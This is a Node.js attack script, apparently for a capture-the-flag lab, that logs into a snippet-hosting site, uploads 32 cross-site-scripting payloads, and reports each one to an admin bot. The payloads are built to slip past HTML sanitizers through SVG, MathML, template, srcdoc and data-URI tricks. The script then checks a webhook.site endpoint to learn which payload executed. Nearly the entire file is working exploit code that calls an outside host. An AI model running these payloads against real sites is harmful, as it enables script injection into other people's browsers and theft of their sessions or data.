const fs = require('node:fs/promises');

const ORIGIN = 'https://ab70eeb2cb7d.pwnbox-lab.com';
const WEBHOOK_TOKEN = 'ddf6fab2-1890-49b7-a513-247891377637';
const WEBHOOK = `https://webhook.site/${WEBHOOK_TOKEN}`;
const WEBHOOK_API = `https://webhook.site/token/${WEBHOOK_TOKEN}/requests?sorting=newest`;

const markerUrl = id => `${WEBHOOK}?m=${encodeURIComponent(id)}`;
const js = id => `fetch(${JSON.stringify(markerUrl(id))})`;
const img = id => `<img src=x onerror="${js(id)}">`;
const svgLoad = id => `<svg onload="${js(id)}"></svg>`;

const payloads = [
  ['control_img_onerror', id => img(id)],
  ['control_svg_onload', id => svgLoad(id)],
  ['math_annotation_xml', id => `<math><annotation-xml encoding="text/html">${img(id)}</annotation-xml></math>`],
  ['math_mtext_table', id => `<math><mtext><table>${img(id)}</table></mtext></math>`],
  ['math_mtext_svg', id => `<math><mtext><svg>${svgLoad(id)}</svg></mtext></math>`],
  ['svg_foreignobject_img', id => `<svg><foreignObject>${img(id)}</foreignObject></svg>`],
  ['svg_foreignobject_body', id => `<svg><foreignObject><body>${img(id)}</body></foreignObject></svg>`],
  ['svg_desc_cdata_break', id => `<svg><desc><![CDATA[</desc>${img(id)}]]></desc></svg>`],
  ['svg_title_break', id => `<svg><title></title>${img(id)}</svg>`],
  ['svg_style_break', id => `<svg><style><!--</style>${img(id)}--></svg>`],
  ['svg_style_p_break', id => `<svg><p><style>${img(id)}</style></p></svg>`],
  ['table_svg_title_attr', id => `<table><svg><title><img title="</title>${img(id).replaceAll('"', '&quot;')}"></title></svg></table>`],
  ['html_head_img', id => `<html><head>${img(id)}</head><body>x</body></html>`],
  ['template_dsd_img', id => `<div><template shadowrootmode="open">${img(id)}</template></div>`],
  ['template_dsd_svg', id => `<div><template shadowrootmode="open">${svgLoad(id)}</template></div>`],
  ['iframe_srcdoc', id => `<iframe srcdoc="<script>${js(id).replaceAll('"', '&quot;')}<\/script>"></iframe>`],
  ['object_data_html', id => `<object data="data:text/html,<script>fetch('${markerUrl(id)}')<\/script>"></object>`],
  ['embed_src_html', id => `<embed src="data:text/html,<script>fetch('${markerUrl(id)}')<\/script>">`],
  ['meta_refresh', id => `<meta http-equiv="refresh" content="0;url=${markerUrl(id)}">`],
  ['link_prefetch', id => `<link rel="prefetch" href="${markerUrl(id)}">`],
  ['svg_a_data', id => `<svg><a href="data:text/html,<script>fetch('${markerUrl(id)}')<\/script>"><text>x</text></a></svg>`],
  ['svg_set_href', id => `<svg><a id="x"><text>x</text></a><set href="#x" attributeName="href" to="javascript:${js(id)}"></set></svg>`],
  ['svg_animate_href', id => `<svg><a id="x"><text>x</text></a><animate href="#x" attributeName="href" values="javascript:${js(id)}"></animate></svg>`],
  ['details_ontoggle', id => `<details open ontoggle="${js(id)}"><summary>x</summary></details>`],
  ['marquee_onstart', id => `<marquee onstart="${js(id)}">x</marquee>`],
  ['video_source_onerror', id => `<video><source src=x onerror="${js(id)}"></video>`],
  ['image_src_svg_data', id => `<svg><image href="data:image/svg+xml;base64,${Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" onload="parent.fetch('${markerUrl(id)}')"></svg>`).toString('base64')}"></image></svg>`],
  ['use_src_svg_data', id => `<svg><use href="data:image/svg+xml;base64,${Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg"><g id="x"><animate attributeName="opacity" from="0" to="1" begin="0s" dur="1s" onbegin="parent.fetch('${markerUrl(id)}')"/></g></svg>`).toString('base64')}#x"></use></svg>`],
  ['style_import', id => `<style>@import url("${markerUrl(id)}");</style>`],
  ['svg_style_import', id => `<svg><style>@import url("${markerUrl(id)}");</style></svg>`],
  ['css_bg_url', id => `<p style="background:url(${markerUrl(id)})">x</p>`],
  ['svg_filter_url', id => `<svg><rect width="100" height="100" filter="url(${markerUrl(id)})"></rect></svg>`],
];

async function request(path, options = {}) {
  const res = await fetch(`${ORIGIN}${path}`, options);
  const text = await res.text();
  return { res, text };
}

function cookieHeader(headers) {
  const cookies = headers.getSetCookie
    ? headers.getSetCookie()
    : [headers.get('set-cookie')].filter(Boolean);
  return cookies.map(c => c.split(';')[0]).join('; ');
}

async function seen(marker) {
  const res = await fetch(WEBHOOK_API);
  const data = await res.json();
  return data.data.some(r => r.query && r.query.m === marker);
}

async function reportWithCooldown(cookie, url) {
  for (let attempt = 0; attempt < 4; attempt++) {
    const rep = await request('/api/report', {
      method: 'POST',
      headers: { Cookie: cookie, 'Content-Type': 'application/json' },
      body: JSON.stringify({ url }),
    });
    const data = JSON.parse(rep.text);
    if (!data.ignored) return { rep, data };
    const waitMs = Math.max(1500, ((data.cooldownSeconds || 2) + 1) * 1000);
    await new Promise(resolve => setTimeout(resolve, waitMs));
  }
  throw new Error(`report stayed ignored for ${url}`);
}

async function main() {
  const login = await request('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: 'demo', password: 'demo' }),
  });
  if (!login.res.ok) throw new Error(`login failed ${login.res.status}: ${login.text}`);
  const cookie = cookieHeader(login.res.headers);

  const hits = [];
  for (let i = 0; i < payloads.length; i++) {
    const [name, build] = payloads[i];
    const marker = `${String(i).padStart(2, '0')}_${name}_${Date.now()}`;
    const payload = build(marker);
    const file = new File([payload], `${name}.html`, { type: 'text/html' });
    const fd = new FormData();
    fd.set('snippet', file);

    const up = await request('/api/snippet', {
      method: 'POST',
      headers: { Cookie: cookie },
      body: fd,
    });
    if (!up.res.ok) {
      console.log(JSON.stringify({ name, upload_status: up.res.status, body: up.text }));
      continue;
    }
    const meta = JSON.parse(up.text);
    const url = `${ORIGIN}${meta.url}`;
    const { rep, data } = await reportWithCooldown(cookie, url);
    console.log(JSON.stringify({ i, name, marker, url, report_status: rep.res.status, report: data }));
    await new Promise(resolve => setTimeout(resolve, 2500));
    if (await seen(marker)) {
      hits.push({ name, marker, url, payload });
      console.log('HIT ' + JSON.stringify(hits[hits.length - 1]));
      break;
    }
  }

  await fs.writeFile('labs/collide-bot-fuzz-results.json', JSON.stringify({ hits }, null, 2));
  console.log('DONE ' + JSON.stringify({ hits }));
}

main().catch(err => {
  console.error(err);
  process.exit(1);
});
